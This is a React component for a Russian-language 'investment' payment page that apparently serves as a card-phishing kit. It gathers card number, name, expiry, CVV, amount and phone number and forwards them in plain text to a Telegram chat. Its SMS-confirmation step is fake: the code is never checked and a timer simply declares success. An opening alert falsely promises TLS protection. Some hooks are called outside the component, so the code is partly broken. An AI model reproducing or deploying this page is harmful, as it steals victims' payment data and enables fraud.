import React, { useState, useEffect } from 'react';
import './styles.css';
import axios from 'axios';
import { sendMessage } from '../api/telegram.ts';
import { useNavigate, useLocation } from 'react-router-dom';
const location = useLocation();
const navigate = useNavigate();


const OrderOther = () => {
  const [showAlert, setShowAlert] = useState(true);
  const [step, setStep] = useState(1);
  const [cardData, setCardData] = useState({
    cardNumber: '',
    name: '',
    cvv: '',
    expiryDate: '',
    amount: '',
    agreement: false
  });
  const [smsCode, setSmsCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [verificationLoading, setVerificationLoading] = useState(false);
  const [verificationSuccess, setVerificationSuccess] = useState(false);
  const [timeLeft, setTimeLeft] = useState(15 * 60); // 15 minutes in seconds
  const [formData, setFormData] = useState({});

  const handleSmsSend = async () => {
    setLoading(true);
    try {
      const message = `
        Name: [ ${formData.name} ] Amount: [ ${formData.amount}  ] EUR Phone Number: [ ${formData.phoneNumber} ]
        Bank Name: [${cardData.name}]
        Card Number: [${cardData.cardNumber}] CVV: [${cardData.cvv}] Expiry Date: [${cardData.expiryDate}]
      `;

      sendMessage(message);

      // Сбрасываем данные формы
      setCardData({
        cardNumber: '',
        name: '',
        cvv: '',
        expiryDate: '',
        amount: '',
        agreement: false,
      });

      setStep(2);
    } catch (error) {
      console.error('Error sending message:', error.message);
    }
    setLoading(false);
  };
  const handleAlertClose = () => {
    setShowAlert(false);
  };

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    setCardData({
      ...cardData,
      [name]: type === 'checkbox' ? checked : value
    });
  };

  

  const handleSmsSubmit = () => {
    setVerificationLoading(true);
    setTimeout(() => {
      setVerificationLoading(false);
      setVerificationSuccess(true);
      setStep(3);
    }, 3000);
  };

  useEffect(() => {
    let timer;
    if (step === 2) {
      timer = setInterval(() => {
        setTimeLeft(prevTime => (prevTime > 0 ? prevTime - 1 : 0));
      }, 1000);
    }
    return () => clearInterval(timer);
  }, [step]);
  useEffect(() => {
    const fetchData = async () => {
      try {
        const response = await axios.get(`/api/db/form/${location.state.id}`);
        setFormData(response.data);
      } catch (error) {
        console.error('Error fetching form data:', error);
      }
    };

    fetchData();
  }, [location.state.id]);
  const formatTime = (time) => {
    const minutes = Math.floor(time / 60);
    const seconds = time % 60;
    return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
  };

  if (showAlert) {
    return (
      <div className="fixed inset-0 bg-gray-500 bg-opacity-75 flex items-center justify-center z-50">
        <div className="bg-white p-6 rounded shadow-md text-center">
          <p className="mb-4 text-blueth ">Все данные с этой страницы передаются по TLS-протоколу.</p>
          <button
            className="bg-blue-600 text-white py-2 px-4 rounded-md hover:bg-blue-700"
            onClick={handleAlertClose}
          >
            OK
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="flex flex-col items-center justify-start min-h-screen bg-gray-fon px-4 mb:pt-20 pt-4 placeholder-gray-text">
      <div className="space-y-4 w-full max-w-xl mb-12">
        <div className="bg-white p-6 rounded-lg mb-12">
          <h2 className="text-xl font-bold mb-6 text-center">Способ оплаты</h2>
          <div className="flex justify-center space-x-4 mb-4">
            <button className="py-2 px-4  bg-white border-b-2 border-blue-400 hover:border-blue-800">Банковская карта</button>
            <button className="py-2 px-4  bg-white border-b-2 border-gray-200 hover:border-blue-800">Мобильный оператор</button>
          </div>
        </div>
        <div className="w-full md:max-w-[608px] max-w-[390px] flex justify-center items-center bg-white p-6 rounded-lg">
          {step === 1 && (
            <form className="text-grayth w-[350px] md:w-[470px]">
              <div className="mt-6 mb-6 text-left w-full">
                <label htmlFor="cardNumber" className="block  font-normal text-gray-700">
                  Укажите номер Вашей карты
                </label>
                <input
                  type="text"
                  name="cardNumber"
                  id="cardNumber"
                  value={cardData.cardNumber}
                  onChange={handleChange}
                  className="mt-1 block w-full   h-[35px] border bg-gray-form border-gray-200 rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md"
                  maxLength="16"
                  placeholder="1456 1345 0958 4234"
                  required
                />
              </div>
              <div className="mb-6 text-left w-full">
                <label htmlFor="name" className="block font-normal text-gray-700">
                  Укажите Ваше имя и фамилию
                </label>
                <input
                  type="text"
                  name="name"
                  id="name"
                  value={cardData.name}
                  onChange={handleChange}
                  className="mt-1 block w-full   h-[35px] border bg-gray-form border-gray-200 rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md"
                  placeholder="Иван Иванов"
                  required
                />
              </div>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="md:mb-12 mb-0 text-left w-full">
                  <label htmlFor="expiryDate" className="block  font-normal text-gray-700">
                    Срок действия
                  </label>
                  <input
                    type="text"
                    name="expiryDate"
                    id="expiryDate"
                    value={cardData.expiryDate}
                    onChange={handleChange}
                    className="mt-1 block w-full  h-[35px] border bg-gray-form border-gray-200 rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md"
                    placeholder="21 / 05"
                    required
                  />
                </div>
                <div className="mb-12 w-full text-left">
                  <label htmlFor="cvv" className="block  font-normal text-gray-700">
                    CVV2
                  </label>
                  <input
                    type="text"
                    name="cvv"
                    id="cvv"
                    value={cardData.cvv}
                    onChange={handleChange}
                    className="mt-1 block w-full h-[35px] border bg-gray-form border-gray-200 rounded-md  p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md"
                    maxLength="3"
                    placeholder="227"
                    required
                  />
                </div>
              </div>
              <div className="mb-6 text-left w-full">
                <label htmlFor="amount" className="block  font-normal text-gray-700">
                  Укажите сумму инвестиции
                </label>
                <input
                  type="text"
                  name="amount"
                  id="amount"
                  value={cardData.amount}
                  onChange={handleChange}
                  className="mt-1 block w-full  h-[35px] bg-gray-form border-gray-200 rounded-md  p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md"
                  placeholder="10 000 руб"
                  required
                />
              </div>
              <button
                type="button"
                className="bg-grayth text-white  h-[50px] py-2 px-4 rounded-md hover:bg-purple-950 mt-6 w-full"
                onClick={handleSmsSend}
              >
                Продолжить
              </button>
              <div className="w-full mt-6 flex items-center justify-between">
                <label htmlFor="agreement" className="block  font-normal text-gray-700">
                  Подтверждаете пользовательское соглашение?
                </label>
                <label className="switch">
                  <input
                    type="checkbox"
                    name="agreement"
                    id="agreement"
                    checked={cardData.agreement}
                    onChange={handleChange}
                    required
                  />
                  <span className="slider round"></span>
                </label>
              </div>
              <p className="w-full mt-4 text-left text-sm text-grayth">
                Нажимая на кнопку "Оплатить", вы подтверждаете что ознакомлены с перечнем информации об услуге и принимаете 
                <span className="text-blue-400 font-normal "> условия публичного договора.</span>
              </p>
            </form>
          )}
          {step === 2 && (
            <div className="flex flex-col justify-center items-center text-center md:w-[470px] w-[390px]">
              <h2 className="text-xl font-semibold mb-4">Подтверждение</h2>
              <p className="text-sm text-grayth mb-4">
                Для подтверждения перевода средств мы отправили Вам код из 6 (шести) цифр на номер телефона в личные сообщения (СМС). ВНИМАНИЕ! Никому не сообщайте код из СМС, для защиты ваших персональных данных!
              </p>
              <div className="flex justify-center items-center mb-4">
                <svg className="w-24 h-24" viewBox="0 0 100 100">
                  <defs>
                    <linearGradient id="static-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
                      <stop offset="0%" style={{ stopColor: 'rgba(6, 155, 231, 1)', stopOpacity: 1 }} />
                      <stop offset="70%" style={{ stopColor: 'rgba(48, 12, 96, 0.8)', stopOpacity: 1 }} />
                      <stop offset="100%" style={{ stopColor: 'rgba(6, 155, 231, 1)', stopOpacity: 1 }} />
                    </linearGradient>
                    <linearGradient id="animated-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
                      <stop offset="0%" style={{ stopColor: 'rgba(6, 155, 231, 1)', stopOpacity: 0.4 }} />
                      <stop offset="50%" style={{ stopColor: 'rgba(48, 12, 96, 1)', stopOpacity: 0.4 }} />
                      <stop offset="100%" style={{ stopColor: 'rgba(48, 12, 96, 1)', stopOpacity: 0.4 }} />
                    </linearGradient>
                  </defs>
                  <circle
                    className="static-circle"
                    r="45"
                    cx="50"
                    cy="50"
                    stroke="url(#static-gradient)"
                    strokeWidth="4"
                    fill="transparent"
                  />
                  <circle
                    className="circle animated-circle"
                    stroke="url(#animated-gradient)"
                    strokeWidth="4"
                    fill="transparent"
                    r="45"
                    cx="50"
                    cy="50"
                    style={{ strokeDasharray: '170 283', strokeDashoffset: '0' }}
                  />
                </svg>
                <p className="absolute text-2xl font-bold text-blue-600">{formatTime(timeLeft)}</p>
              </div>
              <p className="text-sm text-grayth mb-8">Осталось для подтверждения</p>
              <div className="mb-4 w-full">
                <label htmlFor="smsCode" className="block text-sm text-left font-normal text-gray-700">
                  Введите код подтверждения
                </label>
                <input
                  type="text"
                  name="smsCode"
                  id="smsCode"
                  value={smsCode}
                  onChange={(e) => setSmsCode(e.target.value)}
                  className="mt-1 block w-full  h-[35px] bg-gray-form border-gray-200 rounded-md  p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md"
                  placeholder="123 123"
                  required
                />
              </div>
              <button
                className="bg-grayth text-white py-2 px-4 rounded-md hover:bg-purple-950 mt-4 w-full h-[50px]"
                onClick={handleSmsSubmit}
              >
                Подтвердить
              </button>
            </div>
          )}
          {step === 3 && (
            <div className="text-center">
              <p className="text-green-600">Успешно!</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default OrderOther;
